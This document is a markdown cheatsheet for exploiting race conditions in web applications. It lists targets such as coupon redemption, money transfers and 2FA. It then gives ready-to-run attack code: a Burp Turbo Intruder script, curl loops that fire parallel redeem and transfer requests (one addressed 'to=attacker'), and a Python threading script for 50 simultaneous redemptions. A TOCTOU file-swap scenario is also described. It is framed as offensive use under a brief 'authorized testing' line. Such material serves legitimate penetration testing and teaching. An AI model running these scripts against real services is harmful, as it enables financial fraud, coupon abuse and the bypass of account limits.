# ⚡ Race Conditions Cheatsheet

> **Review status:** Source verification pending. Confirm version-sensitive commands against the official documentation before use.

```
  ██████╗  █████╗  ██████╗███████╗     ██████╗ ██████╗ ███╗   ██╗██████╗ ██╗████████╗██╗ ██████╗ ███╗   ██╗███████╗
  ██╔══██╗██╔══██╗██╔════╝██╔════╝    ██╔════╝██╔═══██╗████╗  ██║██╔══██╗██║╚══██╔══╝██║██╔═══██╗████╗  ██║██╔════╝
  ██████╔╝███████║██║     █████╗      ██║     ██║   ██║██╔██╗ ██║██║  ██║██║   ██║   ██║██║   ██║██╔██╗ ██║███████╗
  ██╔══██╗██╔══██║██║     ██╔══╝      ██║     ██║   ██║██║╚██╗██║██║  ██║██║   ██║   ██║██║   ██║██║╚██╗██║╚════██║
  ██║  ██║██║  ██║╚██████╗███████╗    ╚██████╗╚██████╔╝██║ ╚████║██████╔╝██║   ██║   ██║╚██████╔╝██║ ╚████║███████║
  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝
```

---

## 🎯 What are Race Conditions

**Race conditions** occur when timing of operations can be exploited, such as check-then-use vulnerabilities.

### Impact
- 💰 **Financial Fraud** - Multiple redemptions
- 🎫 **Coupon Abuse** - Redeem same code multiple times
- 👤 **Privilege Escalation** - Bypass checks
- 📂 **File Overwrites** - TOCTOU attacks

---

## 🔍 Common Targets

```
- Coupon/promo code redemption
- Vote/like systems
- Money transfers
- Limit-based operations
- File uploads
- Password reset
- 2FA verification
- Account registration
```

---

## 💉 Exploitation Techniques

### Burp Suite Turbo Intruder

```python
# Send request multiple times simultaneously
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=30,
        requestsPerConnection=100,
        pipeline=True
    )
    
    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, response):
    if '200' in response.status:
        table.add(response)
```

### Burp Repeater (Manual)
```
1. Send request to Repeater
2. Duplicate tab 20+ times
3. Create tab group
4. Click "Send group (parallel)"
```

### curl Parallel
```bash
# Send 20 parallel requests
seq 1 20 | xargs -P 20 -I {} curl -s https://target.com/redeem?code=PROMO123

# With POST data
for i in {1..20}; do
  curl -X POST https://target.com/transfer \
    -d "amount=100&to=attacker" &
done
wait
```

### Python Threading
```python
import threading
import requests

def exploit():
    r = requests.post("https://target.com/redeem", 
                      data={"code": "PROMO50"})
    print(r.status_code)

threads = []
for i in range(50):
    t = threading.Thread(target=exploit)
    threads.append(t)

# Start all at once
for t in threads:
    t.start()

for t in threads:
    t.join()
```

---

## 📊 Common Scenarios

### Coupon Code Race
```
1. Coupon = 50% discount
2. Normally: redeem once
3. Race: redeem 10x simultaneously
4. Result: 10 orders with 50% off
```

### Limit Bypass
```
1. Limit: 3 downloads/day
2. Race: Request 10 downloads at once
3. Check happens simultaneously
4. Result: All 10 succeed before limit kicks in
```

### File Upload Race (TOCTOU)
```
1. Upload file → validated as safe
2. Before move, replace with malicious
3. Server moves malicious file instead
```

---

## 🛠️ Tools

| Tool | Purpose |
|------|---------|
| **Turbo Intruder** | Burp extension for parallel requests |
| **race-the-web** | Go tool for race conditions |
| **racepwn** | Python race condition tool |

---

## 📚 Resources

- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
- [OWASP TOCTOU](https://owasp.org/www-community/vulnerabilities/Time_of_check_to_time_of_use)

---

<p align="center">
  <b>⚡ Exploit the Timing!</b><br>
  <i>For authorized testing only!</i>
</p>
